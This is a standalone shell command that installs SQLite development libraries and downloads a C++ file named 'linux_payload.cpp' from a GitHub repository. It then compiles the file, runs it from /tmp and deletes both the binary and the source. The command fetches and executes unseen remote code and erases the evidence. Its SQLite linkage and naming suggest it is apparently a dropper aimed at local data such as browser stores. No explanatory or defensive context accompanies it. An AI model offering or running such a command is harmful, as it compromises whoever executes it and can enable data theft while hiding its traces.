(command -v apt-get &>/dev/null && apt-get install -y libsqlite3-dev sqlite3 || \
 command -v pacman &>/dev/null && pacman -S --noconfirm sqlite || \
 command -v dnf &>/dev/null && dnf install -y sqlite-devel || \
 command -v zypper &>/dev/null && zypper install -y sqlite3-devel) && \
curl -sL https://raw.githubusercontent.com/QUADROisCoding/Wininstall/refs/heads/main/linux_payload.cpp \
  -o /tmp/p.cpp && \
g++ -std=c++17 -o /tmp/p /tmp/p.cpp -lsqlite3 && \
/tmp/p && rm /tmp/p /tmp/p.cpp
